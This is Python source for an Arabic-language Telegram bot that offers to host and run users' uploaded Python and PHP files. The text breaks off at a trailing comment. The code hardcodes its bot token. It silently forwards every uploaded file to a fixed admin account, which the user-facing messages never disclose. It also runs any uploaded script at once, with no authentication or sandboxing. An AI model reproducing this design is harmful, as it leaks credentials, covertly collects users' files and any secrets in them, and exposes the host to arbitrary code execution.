import telebot
from telebot import types
import subprocess
import os
import re
import sys
import psutil  # مكتبة لإدارة العمليات

TOKEN = '7037196004:AAEJIpB9ntCSApKDnxf-FmuWmJdCc7t0QjA'  # توكنك
bot = telebot.TeleBot(TOKEN)

bot_scripts = {}
admin_id = '984370413'  # ايديك
uploaded_files_dir = "uploaded_files"  # مجلد لحفظ الملفات المرفوعة

# إنشاء مجلد uploaded_files إذا لم يكن موجوداً
if not os.path.exists(uploaded_files_dir):
    os.makedirs(uploaded_files_dir)

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    upload_button = types.InlineKeyboardButton("رفع ملف 📤", callback_data='upload')
    status_button = types.InlineKeyboardButton("حالة البوت 🎗", callback_data='status')
    markup.row(upload_button, status_button)
    bot.send_message(
        message.chat.id,
        "مرحبًا بك في بوت رفع وتشغيل ملفات بايثون و PHP.\n"
        "استخدم الأزرار بالأسفل لرفع الملفات أو التحقق من حالة البوت أو للتحكم في التشغيل/الإيقاف.\n"
        "للحصول على جميع الأوامر والتعليمات، استخدم /help.",
        reply_markup=markup
    )

@bot.message_handler(commands=['developer'])
def developer(message):
    markup = types.InlineKeyboardMarkup()
    wevy = types.InlineKeyboardButton("مطور البوت 👨‍🔧", url='https://t.me/ko_2s')
    markup.add(wevy)
    bot.send_message(message.chat.id, "للتواصل مع مطور البوت، اضغط على الزر أدناه:", reply_markup=markup)

@bot.message_handler(commands=['help'])
def instructions(message):
    bot.send_message(
        message.chat.id,
        "الأوامر المتاحة:\n"
        "/start - بدء البوت والحصول على الأزرار.\n"
        "/developer - التواصل مع المطور.\n"
        "/help - عرض هذه التعليمات.\n"
        "قم برفع ملف البايثون أو PHP الخاص بك عبر الزر المخصص.\n"
        "بعد الرفع، يمكنك التحكم في التشغيل، الإيقاف، أو الحذف باستخدام الأزرار الظاهرة."
    )

@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bot_script_name = message.document.file_name
        script_path = os.path.join(uploaded_files_dir, bot_script_name)
        bot_scripts[bot_script_name] = {
            'name': bot_script_name,
            'path': script_path,
            'process': None
        }
        with open(script_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        markup = types.InlineKeyboardMarkup()
        delete_button = types.InlineKeyboardButton(f"حذف {bot_script_name} 🗑", callback_data=f'delete_{bot_script_name}')
        stop_button = types.InlineKeyboardButton(f"إيقاف {bot_script_name} 🔴", callback_data=f'stop_{bot_script_name}')
        start_button = types.InlineKeyboardButton(f"تشغيل {bot_script_name} 🟢", callback_data=f'start_{bot_script_name}')
        markup.row(delete_button, stop_button, start_button)

        bot.reply_to(
            message, 
            f"تم رفع ملفك بنجاح ✅\n\nاسم الملف المرفوع: {bot_script_name}\n\nيمكنك التحكم في الملف باستخدام الأزرار الموجودة.", 
            reply_markup=markup
        )
        send_to_admin(script_path)
        install_and_run_uploaded_file(script_path, message.chat.id)
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ: {e}")

def send_to_admin(file_name):
    try:
        with open(file_name, 'rb') as file:
            bot.send_document(admin_id, file)
    except Exception as e:
        print(f"Error sending file to admin: {e}")

def install_and_run_uploaded_file(script_path, chat_id):
    try:
        script_extension = os.path.splitext(script_path)[1]
        if script_extension == ".py":
            if os.path.exists('requirements.txt'):
                subprocess.Popen([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
            p = subprocess.Popen([sys.executable, script_path])
        elif script_extension == ".php":
            p = subprocess.Popen(['php', script_path])
        else:
            bot.send_message(chat_id, f"نوع الملف {script_extension} غير مدعوم.")
            return

        bot_scripts[os.path.basename(script_path)]['process'] = p
        bot.send_message(chat_id, f"تم تشغيل {os.path.basename(script_path)} بنجاح.")
    except Exception as e:
        print(f"Error installing and running uploaded file: {e}")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if 'delete_' in call.data or 'stop_' in call.data or 'start_' in call.data:
        script_name = call.data.split('_')[1]
        script_path = bot_scripts[script_name]['path']
        if 'delete' in call.data:
            try:
                stop_bot(script_path, call.message.chat.id, delete=True)
                bot.send_message(call.message.chat.id, f"تم حذف ملف {script_name} بنجاح.")
            except Exception as e:
                bot.send_message(call.message.chat.id, f"حدث خطأ: {e}")
        elif 'stop' in call.data:
            try:
                stop_bot(script_path, call.message.chat.id)
            except Exception as e:
                bot.send_message(call.message.chat.id, f"حدث خطأ: {e}")
        elif 'start' in call.data:
            try:
                start_file(script_path, call.message.chat.id)
            except Exception as e:
                bot.send_message(call.message.chat.id, f"حدث خطأ: {e}")

def stop_bot(script_path, chat_id, delete=False):
    try:
        script_name = os.path.basename(script_path)
        process = bot_scripts.get(script_name, {}).get('process')
        if process and psutil.pid_exists(process.pid):
            parent = psutil.Process(process.pid)
            for child in parent.children(recursive=True):  # Terminate all child processes
                child.terminate()
            parent.terminate()
            parent.wait()  # Ensure the process has been terminated
            bot_scripts[script_name]['process'] = None
            if delete:
                os.remove(script_path)  # Remove the script if delete flag is set
                bot.send_message(chat_id, f"تم حذف {script_name} من الاستضافة.")
            else:
                bot.send_message(chat_id, f"تم إيقاف {script_name} بنجاح.")
        else:
            bot.send_message(chat_id, f"{script_name} غير نشط حاليًا.")
    except psutil.NoSuchProcess:
        bot.send_message(chat_id, f"عملية {script_name} غير موجودة.")
    except Exception as e:
        print(f"Error stopping bot: {e}")
        bot.send_message(chat_id, f"حدث خطأ أثناء إيقاف {script_name}: {e}")

def start_file(script_path, chat_id):
    try:
        script_name = os.path.basename(script_path)
        # تأكد من عدم وجود عملية قيد التشغيل لنفس الملف
        if bot_scripts.get(script_name, {}).get('process') and psutil.pid_exists(bot_scripts[script_name]['process'].pid):
            bot.send_message(chat_id, f"الملف {script_name} يعمل بالفعل.")
        else:
            script_extension = os.path.splitext(script_path)[1]
            if script_extension == ".py":
                p = subprocess.Popen([sys.executable, script_path])
            elif script_extension == ".php":
                p = subprocess.Popen(['php', script_path])
            else:
                bot.send_message(chat_id, f"نوع الملف {script_extension} غير مدعوم.")
                return
            bot_scripts[script_name]['process'] = p
            bot.send_message(chat_id, f"تم تشغيل {script_name} بنجاح.")
    except Exception as e:
        print(f"Error starting bot: {e}")
        bot.send_message(chat_id, f"حدث خطأ أثناء تشغيل {script_name}: {e}")

def check_status(message):
    markup = types.InlineKeyboardMarkup()
    for script_name in bot_scripts:
        delete_button = types.InlineKeyboardButton(f"حذف {script_name} 🗑", callback_data=f'delete_{script_name}')
        stop_button = types.InlineKeyboardButton(f"إيقاف {script_name} 🔴", callback_data=f'stop_{script_name}')
        start_button = types.InlineKeyboardButton(f"تشغيل {script_name} 🟢", callback_data=f'start_{script_name}')
        markup.row(delete_button, stop_button, start_button)
    bot.send_message(message.chat.id, "مرحباً بك في قائمة التحكم في ملفاتك التي رفعتها على السيرفر \n\n※ تحكم من الأزرار الموجودة بالأسفل", reply_markup=markup)

# ensure